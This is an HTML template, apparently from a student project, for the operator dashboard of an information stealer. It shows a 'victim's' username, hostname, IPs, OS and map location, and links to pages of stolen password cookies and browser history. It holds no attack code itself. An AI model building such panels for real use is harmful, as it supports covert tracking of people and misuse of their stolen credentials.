<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>User Overview</title>

  <!-- Link Font Awesome untuk ikon -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  
  <!-- Link ke file CSS eksternal -->
  <link rel="stylesheet" href="/static/overview.css">

  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
</head>
<body>

  <!-- Sidebar kiri berisi info user dan navigasi -->
  <div class="sidebar">
    <div class="user-pic">
        <img src="https://via.placeholder.com/80x80/8B4513/FFFFFF?text=Admin" alt="Admin Profile">
    </div> <!-- Foto profil user -->
    <h2>User 1</h2> <!-- Nama user -->
    
    <!-- Menu navigasi -->
    <nav class="sidebar-nav">
      <a class="nav-item active" href="/overview?id={{ victim.id }}">Overview</a>
      <a class="nav-item" href="/device?id={{ victim.id }}">Device Info</a>
      <a class="nav-item" href="/history?id={{ victim.id }}">History</a>
      <a class="nav-item" href="/network?id={{ victim.id }}">Network</a>
      <a class="nav-item" href="/location?id={{ victim.id }}">Location</a>        
      <a class="nav-item" href="/passcookies?id={{ victim.id }}">Pass Cookies</a>
    </nav>

    <!-- Tombol kembali -->
    <div class="back-btn">
        <a href="/victim" class="back-btn">
            <i class="fas fa-arrow-left back-icon"></i>Back</a>
    </div>
  </div>

  <!-- Konten utama -->
  <div class="main-content">

  <!-- Kotak data user -->
  <div class="box beige">
      <strong>Username:</strong> {{ victim.username }}<br>
      <strong>Hostname:</strong> {{ victim.hostname }}
  </div>

  <div class="box blue">
      <strong>City:</strong> {{ victim.city }}<br>
      <strong>Region:</strong> {{ victim.region }}<br>
      <strong>Country:</strong> {{ victim.country }}
  </div>

  <div class="box gray-green">
      <strong>Operating System:</strong> {{ victim.os }}
  </div>

  <div class="box gray-dark">
      <strong>Local IP:</strong> {{ victim.local_ip }}<br>
      <strong>Public IP:</strong> {{ victim.public_ip or 'N/A' }}
  </div>

    <!-- Grafik aktivitas jaringan -->
    <div class="box network-chart">
      <strong>Network</strong><br><br>

      <!-- Tambahkan elemen <canvas> di sini -->
      <canvas id="networkChart"></canvas>

      <!-- Info skala (opsional) -->
      <p class="scale-info">
          Data yang ditampilkan dalam grafik telah dikalikan dengan faktor
          <strong>{{ scale_factor }}</strong> (1.000). Angka sebenarnya adalah hasil perkalian dengan faktor ini.
      </p>
    </div>


    <!-- Peta lokasi user -->
    <div class="box location">
      <strong>Location</strong><br><br>
        <div class="map-container">
          <div id="map"></div>
      </div>
    </div>

    <!-- Informasi cookies -->
    <div class="box pass-cookies">
      <strong>Password Cookies</strong><br><br>
      <div class="url">total data:</div>
    </div>

    <!-- Riwayat browser -->
    <div class="box history-box">
      <strong>History Browser</strong><br><br>
      <div class="browser">total data:</div>
    </div>

    <!-- Info tambahan bawah -->
    <div class="info-tip">
      <div>To obtain detailed information about Password Cookies and History Browser, select the sidebar now!</div>
          
    <div class="logo">
        <img src="/static/image/Logo PBL.png" alt="PBL Logo">
    </div>
    </div>

  </div>


    <script>
        const ctx = document.getElementById('networkChart').getContext('2d');

        const labels = ['Item 1', 'Item 2', 'Item 3', 'Item 4', 'Item 5'];
        const packetSent = [25, 30, 15, 28, 30];
        const packetReceive = [18, 26, 23, 35, 32];

        const data = {
            labels: labels,
            datasets: [
                {
                    label: 'Packet Sent',
                    data: packetSent,
                    borderColor: '#4A90E2',
                    backgroundColor: '#4A90E2',
                    fill: false,
                    tension: 0.3
                },
                {
                    label: 'Packet Receive',
                    data: packetReceive,
                    borderColor: '#8B4513',
                    backgroundColor: '#8B4513',
                    fill: false,
                    tension: 0.3
                }
            ]
        };

        const config = {
            type: 'line',
            data: data,
            options: {
                animation: {
                    duration: 1500, 
                },
                scales: {
                    y: {
                        beginAtZero: true
                    }
                }
            }
        };

        new Chart(ctx, config);
        
        const map = L.map('map').setView([{{ victim.latitude }}, {{ victim.longitude }}], 13);

        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: 'Â© OpenStreetMap contributors'
        }).addTo(map);

        L.marker([{{ victim.latitude }}, {{ victim.longitude }}]).addTo(map)
            .openPopup();
    </script>

</body>
</html>